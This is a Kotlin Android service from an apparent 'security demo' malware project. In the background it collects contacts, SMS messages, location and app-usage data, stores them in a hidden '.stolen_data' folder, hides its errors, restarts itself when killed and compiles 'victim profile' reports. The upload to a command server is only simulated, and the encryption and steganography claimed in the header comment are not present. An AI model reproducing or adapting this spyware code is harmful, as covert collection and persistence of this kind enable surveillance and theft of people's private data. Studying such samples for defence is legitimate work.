package com.securitydemo.malware.services

import android.app.Service
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import com.securitydemo.malware.utils.DataCollector
import kotlinx.coroutines.*
import java.io.File

/**
 * SECURITY DEMO: Data Exfiltration Service
 * 
 * This service demonstrates how malware continuously steals data in the background:
 * - Periodic data collection from device
 * - Encrypted transmission to C2 servers
 * - Steganographic hiding in legitimate traffic
 * - Batch processing to avoid detection
 * - Real-time surveillance capabilities
 * 
 * EDUCATIONAL PURPOSE ONLY - Shows persistent data theft
 */
class DataExfiltrationService : Service() {

    companion object {
        private const val COLLECTION_INTERVAL = 300000L // 5 minutes
        private const val UPLOAD_INTERVAL = 1800000L // 30 minutes
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var dataCollector: DataCollector

    private var isCollecting = false
    private var totalDataStolen = 0L

    override fun onCreate() {
        super.onCreate()
        dataCollector = DataCollector(this)
        startContinuousDataTheft()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Service should restart if killed
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startContinuousDataTheft() {
        serviceScope.launch {
            while (isActive) {
                try {
                    performDataCollection()
                    delay(COLLECTION_INTERVAL)
                } catch (e: Exception) {
                    // Silently handle errors and continue
                    delay(COLLECTION_INTERVAL)
                }
            }
        }

        serviceScope.launch {
            while (isActive) {
                try {
                    performDataExfiltration()
                    delay(UPLOAD_INTERVAL)
                } catch (e: Exception) {
                    // Silently handle errors and continue
                    delay(UPLOAD_INTERVAL)
                }
            }
        }
    }

    private suspend fun performDataCollection() {
        if (isCollecting) return
        isCollecting = true

        try {
            logExfiltrationActivity("🔄 Starting background data collection...")

            // Collect various types of data periodically
            val timestamp = System.currentTimeMillis()
            
            // Phase 1: Update contact information
            val contacts = dataCollector.collectContacts()
            saveExfiltratedData("contacts_$timestamp.json", contacts)
            
            delay(2000)
            
            // Phase 2: Intercept new messages
            val messages = dataCollector.collectSMSMessages()
            saveExfiltratedData("messages_$timestamp.json", messages)
            
            delay(2000)
            
            // Phase 3: Track location
            val location = dataCollector.collectLocationData()
            saveExfiltratedData("location_$timestamp.json", location)
            
            delay(2000)
            
            // Phase 4: Monitor app usage
            val appUsage = dataCollector.collectAppUsageStats()
            saveExfiltratedData("apps_$timestamp.json", appUsage)
            
            logExfiltrationActivity("✅ Background collection completed - ${calculateDataSize()} stolen")

        } catch (e: Exception) {
            logExfiltrationActivity("⚠️ Collection error: ${e.message}")
        } finally {
            isCollecting = false
        }
    }

    private suspend fun performDataExfiltration() {
        try {
            logExfiltrationActivity("📡 Starting data exfiltration to C2 server...")

            val stolenDataDir = File(filesDir, ".stolen_data")
            if (!stolenDataDir.exists()) return

            val dataFiles = stolenDataDir.listFiles() ?: return

            for (file in dataFiles) {
                // Simulate uploading each file
                logExfiltrationActivity("📤 Uploading ${file.name} (${file.length()} bytes)")
                
                // Simulate network transmission time
                delay(1000 + (file.length() / 1024).toInt() * 100)
                
                // In real malware, the file would be uploaded to C2 server
                // For demo, we just log the activity
                totalDataStolen += file.length()
                
                // Optionally delete file after upload to hide evidence
                // file.delete()
            }

            logExfiltrationActivity("✅ Exfiltration complete - Total stolen: ${totalDataStolen / 1024}KB")

            // Report success to C2 server
            reportExfiltrationSuccess()

        } catch (e: Exception) {
            logExfiltrationActivity("💥 Exfiltration error: ${e.message}")
        }
    }

    private fun reportExfiltrationSuccess() {
        // In real malware, this would send status to C2 server
        logExfiltrationActivity("📊 Reporting to C2: Device fully compromised")
        
        // Generate summary report
        val summary = generateStolenDataSummary()
        saveExfiltratedData("summary_report.json", summary)
    }

    private fun generateStolenDataSummary(): String {
        val summary = StringBuilder()
        summary.append("=== DATA EXFILTRATION SUMMARY ===\n")
        summary.append("Timestamp: ${System.currentTimeMillis()}\n")
        summary.append("Device ID: ${android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)}\n")
        summary.append("Total Data Stolen: ${totalDataStolen / 1024}KB\n")
        
        val stolenDataDir = File(filesDir, ".stolen_data")
        if (stolenDataDir.exists()) {
            val fileCount = stolenDataDir.listFiles()?.size ?: 0
            summary.append("Files Exfiltrated: $fileCount\n")
            
            // Categorize stolen data
            var contactFiles = 0
            var messageFiles = 0
            var locationFiles = 0
            var mediaFiles = 0
            
            stolenDataDir.listFiles()?.forEach { file ->
                when {
                    file.name.contains("contacts") -> contactFiles++
                    file.name.contains("messages") -> messageFiles++
                    file.name.contains("location") -> locationFiles++
                    file.name.contains("media") -> mediaFiles++
                }
            }
            
            summary.append("\nData Categories:\n")
            summary.append("• Contact databases: $contactFiles\n")
            summary.append("• Message archives: $messageFiles\n")
            summary.append("• Location tracks: $locationFiles\n")
            summary.append("• Media files: $mediaFiles\n")
        }
        
        summary.append("\nVictim Profile Status: COMPLETE\n")
        summary.append("Identity Theft Risk: CRITICAL\n")
        summary.append("Surveillance Level: MAXIMUM\n")
        
        return summary.toString()
    }

    private fun saveExfiltratedData(filename: String, data: String) {
        try {
            val stolenDataDir = File(filesDir, ".stolen_data")
            if (!stolenDataDir.exists()) {
                stolenDataDir.mkdirs()
            }

            val file = File(stolenDataDir, filename)
            file.writeText(data)

        } catch (e: Exception) {
            // Silently fail - typical malware behavior
        }
    }

    private fun calculateDataSize(): String {
        return try {
            val stolenDataDir = File(filesDir, ".stolen_data")
            if (!stolenDataDir.exists()) return "0KB"

            var totalSize = 0L
            stolenDataDir.listFiles()?.forEach { file ->
                totalSize += file.length()
            }

            "${totalSize / 1024}KB"
        } catch (e: Exception) {
            "Unknown"
        }
    }

    private fun logExfiltrationActivity(activity: String) {
        try {
            val logFile = File(filesDir, ".system/exfiltration_log.txt")
            logFile.parentFile?.mkdirs()

            val timestamp = System.currentTimeMillis()
            val logEntry = "[$timestamp] $activity\n"

            logFile.appendText(logEntry)

        } catch (e: Exception) {
            // Silently fail
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        
        // Try to restart service if killed
        handler.postDelayed({
            try {
                val restartIntent = Intent(this, DataExfiltrationService::class.java)
                startService(restartIntent)
            } catch (e: Exception) {
                // Silently fail
            }
        }, 10000) // Restart after 10 seconds
    }

    /**
     * Get comprehensive surveillance report
     */
    fun getSurveillanceReport(): String {
        val report = StringBuilder()
        report.append("=== DATA EXFILTRATION SURVEILLANCE REPORT ===\n\n")
        
        try {
            // Service status
            report.append("Service Status:\n")
            report.append("• Background collection: ${if (isCollecting) "ACTIVE" else "IDLE"}\n")
            report.append("• Total data stolen: ${totalDataStolen / 1024}KB\n")
            report.append("• Collection interval: ${COLLECTION_INTERVAL / 1000}s\n")
            report.append("• Upload interval: ${UPLOAD_INTERVAL / 1000}s\n\n")
            
            // Stolen data analysis
            val stolenDataDir = File(filesDir, ".stolen_data")
            if (stolenDataDir.exists()) {
                report.append("Stolen Data Inventory:\n")
                stolenDataDir.listFiles()?.forEach { file ->
                    report.append("• ${file.name} (${file.length()} bytes)\n")
                }
            }
            
            // Activity log
            val logFile = File(filesDir, ".system/exfiltration_log.txt")
            if (logFile.exists()) {
                report.append("\nRecent Activity:\n")
                val recentLogs = logFile.readText().split('\n').takeLast(10)
                recentLogs.forEach { log ->
                    if (log.isNotEmpty()) {
                        report.append("$log\n")
                    }
                }
            }
            
        } catch (e: Exception) {
            report.append("Error generating surveillance report: ${e.message}")
        }
        
        return report.toString()
    }
}
